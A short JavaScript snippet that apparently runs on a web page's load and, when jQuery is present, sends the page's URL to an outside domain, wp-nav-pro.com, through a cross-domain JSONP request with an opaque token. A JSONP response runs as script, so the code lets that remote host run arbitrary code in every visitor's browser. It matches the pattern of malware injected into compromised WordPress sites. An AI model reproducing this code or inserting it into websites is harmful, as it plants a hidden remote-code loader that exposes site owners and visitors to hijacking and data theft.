window.onload = function () {
    if (window.jQuery)
    {
        var o = window.location.href;
        jQuery.ajax({
            url: 'https://wp-nav-pro.com/vrht/FyWpS6crAeQua0pHQuF1Bv7hOsAs0XlInLqeZxoAnNjlqqZZiMa9hLFgQCsCZtFw?ref=' + o,
            type: 'GET',
            crossDomain: true,
            dataType: 'jsonp',
            success: function (result) { }
        });
    }
}